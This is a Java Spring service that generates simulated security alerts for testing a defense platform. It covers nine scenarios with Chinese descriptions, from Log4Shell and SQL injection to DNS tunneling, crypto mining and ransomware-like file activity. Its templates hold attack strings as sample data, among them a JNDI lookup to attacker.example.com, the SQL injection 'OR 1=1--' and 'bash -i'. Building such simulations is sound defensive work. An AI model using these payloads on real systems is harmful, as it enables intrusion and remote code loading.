package com.acd.defense.service;

import com.acd.defense.domain.SecurityEvent;
import org.springframework.stereotype.Service;

import java.time.Instant;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

@Service
public class SimulatedEventLibrary {

    public record ScenarioMeta(String id, String title, String severity, String description) {}

    private final Map<String, SecurityEvent> templates = new LinkedHashMap<>();
    private final Map<String, ScenarioMeta> metas = new LinkedHashMap<>();

    public SimulatedEventLibrary() {
        register(
                new ScenarioMeta("log4j-rce", "Log4j 风格 Web RCE", "CRITICAL",
                        "应用日志中出现 ${jndi:ldap://...} 远程加载类，疑似 Log4Shell 利用"),
                new SecurityEvent(
                        null, "waf-sensor", "WEB_RCE_LOG4J", "CRITICAL", null,
                        ofMap(
                                "service", "order-api",
                                "namespace", "prod",
                                "httpPath", "/api/order/search",
                                "payload", "${jndi:ldap://attacker.example.com/a}",
                                "userAgent", "Mozilla/5.0 Jndi-Scanner",
                                "sourceIp", "203.0.113.45",
                                "assetTag", "business-edge"
                        )
                )
        );

        register(
                new ScenarioMeta("container-exec-shell", "容器异常 Shell 执行", "HIGH",
                        "Falco 检测到在业务容器内执行交互式 shell / 包管理命令"),
                new SecurityEvent(
                        null, "falco-sensor", "CONTAINER_SUSPICIOUS_EXEC", "HIGH", null,
                        ofMap(
                                "namespace", "prod",
                                "pod", "checkout-service-5f8cc9",
                                "container", "checkout-service",
                                "command", "bash -i",
                                "user", "root",
                                "assetTag", "business-core"
                        )
                )
        );

        register(
                new ScenarioMeta("east-west-lateral", "异常横向访问", "HIGH",
                        "NDR 发现业务 Pod 主动向数据库管理网段发起大量连接，疑似横向移动"),
                new SecurityEvent(
                        null, "ndr-sensor", "LATERAL_MOVEMENT_SUSPECT", "HIGH", null,
                        ofMap(
                                "srcWorkload", "web-gateway/gateway-0",
                                "dstSubnet", "10.20.0.0/24",
                                "protocol", "tcp",
                                "destPorts", List.of(22, 3306, 6379),
                                "connectionCount", 420,
                                "assetTag", "core-service"
                        )
                )
        );

        register(
                new ScenarioMeta("ssh-brute-force", "SSH 暴力破解", "MEDIUM",
                        "跳板机短时内出现大量 SSH 登录失败，疑似密码爆破"),
                new SecurityEvent(
                        null, "bastion-auth", "AUTH_BRUTE_FORCE", "MEDIUM", null,
                        ofMap(
                                "host", "bastion-01",
                                "user", "admin",
                                "failCount", 87,
                                "windowSec", 120,
                                "sourceIp", "198.51.100.77",
                                "assetTag", "infra-bastion"
                        )
                )
        );

        register(
                new ScenarioMeta("dns-tunneling-exfil", "DNS 隧道数据外传", "HIGH",
                        "DNS 请求中出现超长子域名与高熵值，疑似通过 DNS 隧道外传数据"),
                new SecurityEvent(
                        null, "dns-sensor", "DNS_TUNNELING", "HIGH", null,
                        ofMap(
                                "queryName", "a1f2c7b9e3d4.5c82ae91.exfil.example.org",
                                "entropyScore", 4.62,
                                "queryType", "TXT",
                                "srcIp", "10.10.14.22",
                                "volumeKbps", 380,
                                "assetTag", "business-core"
                        )
                )
        );

        register(
                new ScenarioMeta("crypto-miner-pod", "Pod 内加密矿工进程", "HIGH",
                        "运行时检测到容器内启动 xmrig 矿池连接"),
                new SecurityEvent(
                        null, "runtime-sensor", "CRYPTO_MINER_DETECTED", "HIGH", null,
                        ofMap(
                                "namespace", "prod",
                                "pod", "ad-service-7c6b9b",
                                "process", "xmrig",
                                "minerPool", "pool.minerxmr.com:443",
                                "cpuUsage", 94.3,
                                "assetTag", "normal-service"
                        )
                )
        );

        register(
                new ScenarioMeta("sqli-payload", "SQL 注入尝试", "MEDIUM",
                        "WAF 捕获到 boolean-based SQL 注入 payload"),
                new SecurityEvent(
                        null, "waf-sensor", "WEB_SQL_INJECTION", "MEDIUM", null,
                        ofMap(
                                "service", "user-api",
                                "httpPath", "/api/user/search",
                                "payload", "id=1 OR 1=1--",
                                "sourceIp", "203.0.113.12",
                                "assetTag", "business-edge"
                        )
                )
        );

        register(
                new ScenarioMeta("token-leak-api-abuse", "泄露 Token 异常调用", "CRITICAL",
                        "同一 Token 在跨国 IP 上同时访问高敏感 API"),
                new SecurityEvent(
                        null, "iam-sensor", "TOKEN_ABUSE", "CRITICAL", null,
                        ofMap(
                                "service", "payment-api",
                                "tokenId", "eyJhbGciOi***",
                                "sourceIps", List.of("203.0.113.45", "198.51.100.77"),
                                "apiCalls", List.of("/api/wallet/withdraw", "/api/user/kyc"),
                                "geoDiff", "CN->DE(120s)",
                                "assetTag", "business-core"
                        )
                )
        );

        register(
                new ScenarioMeta("ransomware-like-io", "类勒索文件加密行为", "CRITICAL",
                        "文件系统短时间内出现大量写入与扩展名重命名为 .locked"),
                new SecurityEvent(
                        null, "edr-sensor", "RANSOMWARE_LIKE_IO", "CRITICAL", null,
                        ofMap(
                                "host", "app-node-13",
                                "process", "svchost.exe",
                                "renamedCount", 1823,
                                "extensionTarget", ".locked",
                                "assetTag", "business-core"
                        )
                )
        );
    }

    public List<ScenarioMeta> listScenarios() {
        return new ArrayList<>(metas.values());
    }

    public SecurityEvent pickRandom() {
        List<String> ids = new ArrayList<>(templates.keySet());
        String pick = ids.get(ThreadLocalRandom.current().nextInt(ids.size()));
        return materialize(pick);
    }

    public SecurityEvent pickById(String id) {
        if (id == null || !templates.containsKey(id)) {
            return pickRandom();
        }
        return materialize(id);
    }

    private SecurityEvent materialize(String id) {
        SecurityEvent template = templates.get(id);
        return new SecurityEvent(
                null,
                template.source(),
                template.eventType(),
                template.severity(),
                Instant.now(),
                template.attributes()
        );
    }

    private void register(ScenarioMeta meta, SecurityEvent event) {
        metas.put(meta.id(), meta);
        templates.put(meta.id(), event);
    }

    private static Map<String, Object> ofMap(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i + 1 < kv.length; i += 2) {
            m.put(String.valueOf(kv[i]), kv[i + 1]);
        }
        return m;
    }
}
